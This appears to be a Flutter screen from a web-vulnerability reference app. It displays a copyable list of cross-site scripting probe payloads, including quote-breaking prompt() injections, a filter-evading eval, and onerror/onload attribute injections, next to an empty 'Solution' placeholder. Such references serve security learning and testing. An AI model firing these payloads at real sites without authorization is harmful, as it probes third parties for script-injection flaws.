import 'package:flutter/material.dart';
import 'package:google_fonts/google_fonts.dart';
// import 'package:webvuln/items/categoryButton.dart';
import 'package:flutter/services.dart';

class detail_screen extends StatefulWidget {
  const detail_screen({super.key});

  @override
  State<detail_screen> createState() => _detail_screenState();
}

class _detail_screenState extends State<detail_screen> {
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        leading: IconButton(
          onPressed: () {
            Navigator.pop(context);
          },
          icon: Icon(Icons.arrow_back),
        ),
      ),
      body: Center(
        child: SingleChildScrollView(
          child: Column(
            children: [
              payloads(
                  name: 'Payloads',
                  content:
                      '''"-prompt(8)-"\n'-prompt(8)-'\n";a=prompt,a()//\n';a=prompt,a()//\n'-eval("window['pro'%2B'mpt'](8)")-'\n"-eval("window['pro'%2B'mpt'](8)")-"\n"onclick=prompt(8)>"@x.y\n"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y\n<image/src/onerror=prompt(8)>\n<img/src/onerror=prompt(8)>\n<image src/onerror=prompt(8)>\n<img src/onerror=prompt(8)>\n<image src =q onerror=prompt(8)>\n<img src =q onerror=prompt(8)>'''),
              payloads(
                name: 'Solution', 
                content: '//solution')
            ],
          ),
        ),
      ),
    );
  }

  Container payloads({required String name, required String content}) {
    double width = MediaQuery.of(context).size.width;
    return Container(
      width: double.infinity,
      height: 500,
      margin: EdgeInsets.symmetric(horizontal: 30),
      child: Column(
        children: [
          ListTile(
            leading: Text(
              name,
              style: GoogleFonts.montserrat(
                  fontSize: 24, fontWeight: FontWeight.bold),
            ),
          ),
          Container(
            width: double.infinity,
            height: 400,
            padding: const EdgeInsets.all(20),
            decoration: const BoxDecoration(
                color: Colors.black,
                borderRadius: BorderRadius.all(Radius.circular(20))),
            child: SingleChildScrollView(
              scrollDirection: Axis.vertical,
              child: Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  SelectableText(
                    content,
                    style: const TextStyle(fontSize: 20.0, color: Colors.white),
                  ),
                  // const SizedBox(height: 16.0),
                  Container(
                    margin:const  EdgeInsets.only(bottom: 400),
                    child: IconButton(
                        onPressed: () {
                          _copyToClipboard(context, content);
                        },
                        icon: Icon(Icons.copy,color: Colors.white,size: 30,)),
                  )
                ],
              ),
            ),
          )
        ],
      ),
    );
  }

  void _copyToClipboard(BuildContext context, String text) {
    Clipboard.setData(ClipboardData(text: text));
    final snackBar = SnackBar(content: Text('Text copied to clipboard'));
    ScaffoldMessenger.of(context).showSnackBar(snackBar);
  }
}
